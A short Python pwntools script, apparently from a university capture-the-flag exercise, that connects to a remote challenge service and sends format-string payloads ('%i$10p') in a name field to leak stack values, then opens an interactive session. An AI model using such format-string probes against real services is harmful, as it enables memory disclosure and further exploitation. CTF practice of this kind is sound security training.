#!/usr/bin/python3
from pwn import *

p = remote("ctf-fsi.fe.up.pt", 4002)

for i in range(1,14):
    p.recvuntil(b">")
    p.sendline(b"e")
    p.recvuntil(b"Insert your name (max 20 chars): ")
    p.sendline("%" + str(i) + "$10p")
    answer = p.recvline()
    print("i: ", i, "->stack", answer)
    p.recvuntil(b"Insert your message: ")
    p.sendline(b"")

p.interactive()
